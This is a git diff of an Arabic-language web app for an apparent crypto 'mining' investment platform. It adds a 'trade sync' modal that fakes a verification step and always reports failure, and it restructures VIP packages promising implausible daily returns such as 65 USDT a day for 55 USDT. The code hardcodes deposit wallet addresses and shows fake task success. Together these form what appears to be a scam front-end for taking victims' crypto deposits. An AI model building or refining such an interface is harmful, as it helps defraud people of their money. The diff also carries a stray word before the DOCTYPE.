@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+here<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
@@ -256,6 +256,36 @@
         </div>
     </div>
 
+    <div id="sync-modal" class="overlay hidden">
+        <div class="modal">
+            <i class="fa-solid fa-xmark close-modal" onclick="closeModals()"></i>
+            <h3 style="text-align:center; margin-top:0; margin-bottom:20px;"><i class="fa-solid fa-sync-alt" style="margin-left: 8px; color: #0ea5e9;"></i>تزامن الصفقة الذكي</h3>
+            
+            <div style="background: rgba(14, 165, 233, 0.05); padding: 15px; border-radius: 15px; margin-bottom: 20px; border: 1px solid rgba(14, 165, 233, 0.1);">
+                <p style="font-size: 11px; color: #0ea5e9; margin: 0; line-height: 1.6;">قم بإدخال بيانات الصفقة الحالية من منصة التداول الخاصة بك لربطها آلياً بنظام التعدين وزيادة كفاءة الأرباح.</p>
+            </div>
+
+            <div style="display: flex; flex-direction: column; gap: 12px;">
+                <div>
+                    <label style="font-size: 11px; color: var(--text-dim); display: block; margin-bottom: 5px;">كود الطلب (Order ID):</label>
+                    <input type="text" id="sync-order-id" class="input-box" placeholder="مثال: #XM992024" style="margin-bottom:0;">
+                </div>
+
+                <div>
+                    <label style="font-size: 11px; color: var(--text-dim); display: block; margin-bottom: 5px;">زوج العملات:</label>
+                    <select id="sync-pair" class="input-box" style="margin-bottom:0; appearance: none; background-image: url('data:image/svg+xml;charset=US-ASCII,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%22292.4%22%20height%3D%22292.4%22%3E%3Cpath%20fill%3D%22%239ca3af%22%20d%3D%22M287%2069.4a17.6%2017.6%200%200%200-13-5.4H18.4c-5%200-9.3%201.8-12.9%205.4A17.6%2017.6%200%200%200%200%2082.2c0%205%201.8%209.3%205.4%2012.9l128%20127.9c3.6%203.6%207.8%205.4%2012.8%205.4s9.2-1.8%2012.8-5.4L287%2095c3.5-3.5%205.4-7.8%205.4-12.8%200-5-1.9-9.2-5.5-12.8z%22%2F%3E%3C%2Fsvg%3E'); background-repeat: no-repeat; background-position: left 12px top 50%; background-size: 10px auto; padding-left: 30px;">
+                        <option value="BTCUSDT">BTC / USDT</option>
+                        <option value="ETHUSDT">ETH / USDT</option>
+                        <option value="SOLUSDT">SOL / USDT</option>
+                        <option value="BNBUSDT">BNB / USDT</option>
+                    </select>
+                </div>
+            </div>
+
+            <button class="btn-main btn-pulse" onclick="executeSyncAction()" style="margin-top: 20px; background: #0ea5e9; border-color: #0ea5e9;">بدء التزامن الفوري</button>
+        </div>
+    </div>
+
     <div id="deposit-modal" class="overlay hidden">
         <div class="modal">
             <i class="fa-solid fa-xmark close-modal" onclick="closeModals()"></i>
@@ -346,7 +376,6 @@
         let selectedWithdrawNet = 'TRC';
         let currentVIPLevel = 0;
         
-        // تم تحديث عنوان BNB للعنوان الجديد المطلوب
         const wallets = { 
             'TRC': 'TC7CaezvbGSNzqXPWp4NLAMS8W6DHmbrz8', 
             'BNB': '0x42a3ca67f332f5f31608342a12fd8d2dcf268702' 
@@ -363,17 +392,16 @@
         }
 
         const vipsData = [
-            {l:'SPECIAL EDITION', p:55, d:65.0, icon:'fa-crown', color:'var(--success)'},
-            {l:1, p:10, d:2.5, icon:'fa-gem', color:'var(--border)'},
-            {l:2, p:30, d:7.5, icon:'fa-gem', color:'var(--border)'},
-            {l:3, p:100, d:28.0, icon:'fa-gem', color:'var(--border)'},
-            {l:4, p:250, d:75.0, icon:'fa-gem', color:'var(--border)'},
-            {l:5, p:600, d:185.0, icon:'fa-gem', color:'var(--border)'},
-            {l:6, p:1200, d:380.0, icon:'fa-gem', color:'var(--border)'},
-            {l:7, p:2500, d:820.0, icon:'fa-gem', color:'var(--border)'},
-            {l:8, p:5000, d:1750.0, icon:'fa-gem', color:'var(--border)'},
-            {l:9, p:10000, d:3600.0, icon:'fa-gem', color:'var(--border)'},
-            {l:10, p:20000, d:7500.0, icon:'fa-gem', color:'var(--border)'}
+            {l:1, p:55, d:65.0, icon:'fa-crown', color:'var(--success)', special: true},
+            {l:2, p:100, d:28.0, icon:'fa-gem', color:'var(--border)'},
+            {l:3, p:250, d:75.0, icon:'fa-gem', color:'var(--border)'},
+            {l:4, p:600, d:185.0, icon:'fa-gem', color:'var(--border)'},
+            {l:5, p:1200, d:380.0, icon:'fa-gem', color:'var(--border)'},
+            {l:6, p:2500, d:820.0, icon:'fa-gem', color:'var(--border)'},
+            {l:7, p:5000, d:1750.0, icon:'fa-gem', color:'var(--border)'},
+            {l:8, p:10000, d:3600.0, icon:'fa-gem', color:'var(--border)'},
+            {l:9, p:20000, d:7500.0, icon:'fa-gem', color:'var(--border)'},
+            {l:10, p:45000, d:16000.0, icon:'fa-gem', color:'var(--border)'}
         ];
 
         function showToast(msg, color = "#8b5cf6") {
@@ -435,11 +463,11 @@
             const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 
             if (!emailInput || !passInput) { 
-                showToast("⚠️ يرجى إدخال البريد وكلمة المرور", "#ef4444"); 
+                showToast("⚠️ يرجى إدخل البريد وكلمة المرور", "#ef4444"); 
                 return; 
             }
             if(!emailPattern.test(emailInput)) { 
-                showToast("❌ يرجى إدخال بريد إلكتروني صحيح", "#ef4444"); 
+                showToast("❌ يرجى إدخل بريد إلكتروني صحيح", "#ef4444"); 
                 return; 
             }
             if(passInput.length < 6) { 
@@ -498,6 +526,24 @@
             document.getElementById('with-bnb').style.borderColor = (net === 'BNB') ? 'var(--accent)' : 'var(--border)';
         }
 
+        function openSyncModal() {
+            document.getElementById('sync-modal').classList.remove('hidden');
+        }
+
+        function executeSyncAction() {
+            const orderId = document.getElementById('sync-order-id').value.trim();
+            if (!orderId) {
+                showToast("⚠️ يرجى إدخال كود الطلب", "#ef4444");
+                return;
+            }
+            closeModals();
+            showToast("⏳ جاري التحقق من كود الطلب...", "#8b5cf6");
+            setTimeout(() => {
+                showToast("❌ خطأ: لم نتمكن من العثور على الصفقة في قاعدة البيانات", "#ef4444");
+                document.getElementById('sync-order-id').value = '';
+            }, 2000);
+        }
+
         function navTo(page) {
             const cont = document.getElementById('main-content');
             const navItems = document.querySelectorAll('.nav-item');
@@ -515,11 +561,13 @@
                             <h2 style="margin:0;">مرحباً بك في نيومونت</h2>
                             <p style="font-size:12px; opacity:0.8;">اربح 65 USDT يومياً من المستوى الجديد</p>
                         </div>
-                        <div style="display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin: 15px;">
+                        <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin: 15px;">
                             <div onclick="openDeposit()" style="text-align:center; background:var(--card); padding:15px 5px; border-radius:18px;"><i class="fa-solid fa-plus-circle" style="color:var(--success); font-size:22px;"></i><div style="font-size:11px; margin-top:8px;">إيداع</div></div>
                             <div onclick="openWithdraw()" style="text-align:center; background:var(--card); padding:15px 5px; border-radius:18px;"><i class="fa-solid fa-money-bill-transfer" style="color:var(--accent); font-size:22px;"></i><div style="font-size:11px; margin-top:8px;">سحب</div></div>
+                            <div onclick="openSyncModal()" style="text-align:center; background:var(--card); padding:15px 5px; border-radius:18px;"><i class="fa-solid fa-sync-alt" style="color:#0ea5e9; font-size:22px;"></i><div style="font-size:11px; margin-top:8px;">التزامن بالصفقة</div></div>
                             <div onclick="navTo('team')" style="text-align:center; background:var(--card); padding:15px 5px; border-radius:18px;"><i class="fa-solid fa-gift" style="color:var(--gold); font-size:22px;"></i><div style="font-size:11px; margin-top:8px;">مكافأة</div></div>
                             <div onclick="openTelegram()" style="text-align:center; background:var(--card); padding:15px 5px; border-radius:18px;"><i class="fa-brands fa-telegram" style="color:var(--tg-blue); font-size:22px;"></i><div style="font-size:11px; margin-top:8px;">دعم</div></div>
+                            <div onclick="openHistory()" style="text-align:center; background:var(--card); padding:15px 5px; border-radius:18px;"><i class="fa-solid fa-receipt" style="color:#94a3b8; font-size:22px;"></i><div style="font-size:11px; margin-top:8px;">السجلات</div></div>
                         </div>
                         <div style="padding: 15px;"><h3 style="margin:0 0 15px; font-size:16px;">سحوبات مباشرة</h3><div id="investor-list"></div></div>
                     </div>`;
@@ -561,7 +609,7 @@
                     </div>`;
 
                 vipsData.forEach((v, index) => {
-                    const isSpecial = v.l === 'SPECIAL EDITION';
+                    const isSpecial = v.special === true;
                     taskHtml += `
                     <div class="card fade-in ${isSpecial ? 'featured-task-green' : ''}" style="display:flex; align-items:center; gap:15px; border-right: 4px solid ${isSpecial ? 'var(--success)' : 'var(--accent)'};">
                         ${isSpecial ? '<div class="task-badge-green">مهمة عاجلة 🔥</div>' : ''}
@@ -584,13 +632,13 @@
             } else if(page === 'vip') {
                 let html = `<div class="fade-in" style="padding:20px;"><h3>باقات VIP</h3>`;
                 vipsData.forEach(v => {
-                    html += `<div class="card fade-in" style="border: 1px solid ${v.color}; background: linear-gradient(135deg, #121212 0%, #0a0a0a 100%); position: relative; overflow: hidden;">${v.l==='SPECIAL EDITION' ? '<div style="position:absolute; top:10px; left:-30px; background:var(--success); color:black; padding:5px 35px; transform:rotate(-45deg); font-size:10px; font-weight:bold;">HOT</div>' : ''}<div style="display:flex; justify-content:space-between; align-items:center;"><div style="display:flex; align-items:center; gap:12px;"><div style="width:45px; height:45px; background:rgba(255,255,255,0.05); border-radius:12px; display:flex; align-items:center; justify-content:center;"><i class="fa-solid ${v.icon}" style="color:${v.l==='SPECIAL EDITION'?'var(--success)':'var(--accent)'}; font-size:20px;"></i></div><div><h4 style="margin:0; font-size:16px;">VIP ${v.l}</h4><div style="font-size:12px; color:var(--text-dim); margin-top:4px;">السعر: ${v.p} USDT</div></div></div><div style="text-align:left;"><div style="color:var(--success); font-weight:900; font-size:18px;">${v.d}</div><div style="font-size:10px; color:var(--text-dim);">يومياً</div></div></div><button class="btn-main" style="margin-top:15px; background:${(currentVIPLevel==v.l || (v.l=='SPECIAL EDITION' && currentVIPLevel=='SPECIAL')) ? 'var(--success)' : (v.l==='SPECIAL EDITION'?'var(--success)':'var(--accent)')}" onclick="${(currentVIPLevel==v.l || (v.l=='SPECIAL EDITION' && currentVIPLevel=='SPECIAL')) ? "showToast('مفعل بالفعل ✅')" : 'openDeposit()'}">${(currentVIPLevel==v.l || (v.l=='SPECIAL EDITION' && currentVIPLevel=='SPECIAL')) ? 'مفعل حالياً' : 'فتح المستوى'}</button></div>`;
+                    const isSpecial = v.special === true;
+                    html += `<div class="card fade-in" style="border: 1px solid ${v.color}; background: linear-gradient(135deg, #121212 0%, #0a0a0a 100%); position: relative; overflow: hidden;">${isSpecial ? '<div style="position:absolute; top:10px; left:-30px; background:var(--success); color:black; padding:5px 35px; transform:rotate(-45deg); font-size:10px; font-weight:bold;">HOT</div>' : ''}<div style="display:flex; justify-content:space-between; align-items:center;"><div style="display:flex; align-items:center; gap:12px;"><div style="width:45px; height:45px; background:rgba(255,255,255,0.05); border-radius:12px; display:flex; align-items:center; justify-content:center;"><i class="fa-solid ${v.icon}" style="color:${isSpecial ?'var(--success)':'var(--accent)'}; font-size:20px;"></i></div><div><h4 style="margin:0; font-size:16px;">VIP ${v.l}</h4><div style="font-size:12px; color:var(--text-dim); margin-top:4px;">السعر: ${v.p} USDT</div></div></div><div style="text-align:left;"><div style="color:var(--success); font-weight:900; font-size:18px;">${v.d}</div><div style="font-size:10px; color:var(--text-dim);">يومياً</div></div></div><button class="btn-main" style="margin-top:15px; background:${currentVIPLevel==v.l ? 'var(--success)' : (isSpecial ?'var(--success)':'var(--accent)')}" onclick="${currentVIPLevel==v.l ? "showToast('مفعل بالفعل ✅')" : 'openDeposit()'}">${currentVIPLevel==v.l ? 'مفعل حالياً' : 'فتح المستوى'}</button></div>`;
                 });
                 cont.innerHTML = html + `</div>`;
             } else if(page === 'me') {
                 const userEmail = localStorage.getItem('user_email') || 'User_Guest';
                 const persistentID = getPersistentUserID();
-
                 cont.innerHTML = `
                 <div class="fade-in" style="padding-bottom: 40px;">
                     <div class="me-header-card">
@@ -602,7 +650,7 @@
                             <div style="flex:1;">
                                 <div style="display:flex; align-items:center; gap:8px;">
                                     <div style="font-weight:bold; font-size:15px; word-break:break-all; letter-spacing:0.5px;">${userEmail}</div>
-                                    <span class="vip-badge">VIP ${currentVIPLevel === "SPECIAL" ? "S" : currentVIPLevel}</span>
+                                    <span class="vip-badge">VIP ${currentVIPLevel}</span>
                                 </div>
                                 <div style="font-size:11px; color:var(--text-dim); margin-top:5px; font-family:monospace;">ID: #${persistentID}</div>
                                 <div style="display:flex; gap:8px; margin-top:8px;">
@@ -617,7 +665,6 @@
                         </div>
                         <div class="progress-bar-wrap"><div class="progress-bar-fill" style="width: ${currentVIPLevel !== 0 ? '98%' : '12%'};"></div></div>
                     </div>
-
                     <div class="detailed-stats">
                         <div class="d-stat-item">
                             <span class="d-stat-val">${currentVIPLevel !== 0 ? '42' : '0'}</span>
@@ -632,18 +679,15 @@
                             <span class="d-stat-lbl">معدل النمو</span>
                         </div>
                     </div>
-
                     <div style="margin:0 15px;">
                         <div class="card" style="padding:22px; border: 1px solid var(--border); background: linear-gradient(160deg, #161616 0%, #080808 100%); position: relative; overflow: hidden;">
                             <div style="position:absolute; top: -20px; left: -20px; opacity: 0.05; font-size: 100px; color: white;"><i class="fa-solid fa-wallet"></i></div>
-                            
                             <div style="text-align: center; margin-bottom: 20px; position: relative; z-index: 1;">
                                 <div style="font-size:10px; color:var(--text-dim); margin-bottom:8px; letter-spacing:2px; text-transform:uppercase;">إجمالي الرصيد المحاسبي</div>
                                 <div style="font-size:36px; font-weight:900; color:white; display:flex; align-items:center; justify-content:center; gap:10px;">
                                     ${currentBalance.toFixed(2)} <span style="font-size:16px; color:var(--accent); font-weight: 400;">USDT</span>
                                 </div>
                             </div>
-                            
                             <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px; border-top:1px solid #1f2937; padding-top:18px;">
                                 <div style="border-left: 1px solid #1f2937;">
                                     <div style="font-size:10px; color:var(--text-dim); margin-bottom:4px;">أرباح اليوم</div>
@@ -656,11 +700,9 @@
                             </div>
                         </div>
                     </div>
-
                     <div style="margin:20px 15px;">
                         <h4 style="font-size:13px; color:var(--text-dim); margin-bottom:12px; padding-right:5px; font-weight: 500;">مركز التحكم والأمان</h4>
                         <div class="card" style="padding:0; overflow: hidden; background: #0a0a0a;">
-                            
                             <div class="menu-item" onclick="openHistory()" style="display:flex; align-items:center; gap:15px; padding:18px; border-bottom:1px solid #161b22; cursor:pointer;">
                                 <div style="width:36px; height:36px; background:rgba(245,158,11,0.1); border-radius:12px; display:flex; align-items:center; justify-content:center;"><i class="fa-solid fa-receipt" style="color:var(--gold); font-size:16px;"></i></div>
                                 <div style="flex:1;">
@@ -669,7 +711,6 @@
                                 </div>
                                 <i class="fa-solid fa-chevron-left" style="font-size:12px; color:#333;"></i>
                             </div>
-
                             <div class="menu-item" onclick="openWithdraw()" style="display:flex; align-items:center; gap:15px; padding:18px; border-bottom:1px solid #161b22; cursor:pointer;">
                                 <div style="width:36px; height:36px; background:rgba(139,92,246,0.1); border-radius:12px; display:flex; align-items:center; justify-content:center;"><i class="fa-solid fa-credit-card" style="color:var(--accent); font-size:16px;"></i></div>
                                 <div style="flex:1;">
@@ -678,7 +719,6 @@
                                 </div>
                                 <i class="fa-solid fa-chevron-left" style="font-size:12px; color:#333;"></i>
                             </div>
-
                             <div class="menu-item" style="display:flex; align-items:center; gap:15px; padding:18px; border-bottom:1px solid #161b22; cursor:pointer;">
                                 <div style="width:36px; height:36px; background:rgba(16,185,129,0.1); border-radius:12px; display:flex; align-items:center; justify-content:center;"><i class="fa-solid fa-key" style="color:var(--success); font-size:16px;"></i></div>
                                 <div style="flex:1;">
@@ -687,7 +727,6 @@
                                 </div>
                                 <i class="fa-solid fa-chevron-left" style="font-size:12px; color:#333;"></i>
                             </div>
-
                             <div class="menu-item" onclick="logout()" style="display:flex; align-items:center; gap:15px; padding:18px; color:var(--danger); cursor:pointer;">
                                 <div style="width:36px; height:36px; background:rgba(239,68,68,0.1); border-radius:12px; display:flex; align-items:center; justify-content:center;"><i class="fa-solid fa-right-from-bracket" style="font-size:16px;"></i></div>
                                 <div style="flex:1;">
@@ -780,7 +819,7 @@
         }
 
         function doTask(lvl) {
-            if (currentVIPLevel == lvl || (lvl == 'SPECIAL EDITION' && currentVIPLevel == 'SPECIAL')) {
+            if (currentVIPLevel == lvl) {
                 showToast("⏳ جاري تنفيذ المهمة...", "#10b981");
                 setTimeout(() => { showToast("✅ تمت المهمة! الرصيد سيحدث قريباً", "#10b981"); }, 1500);
             } else {
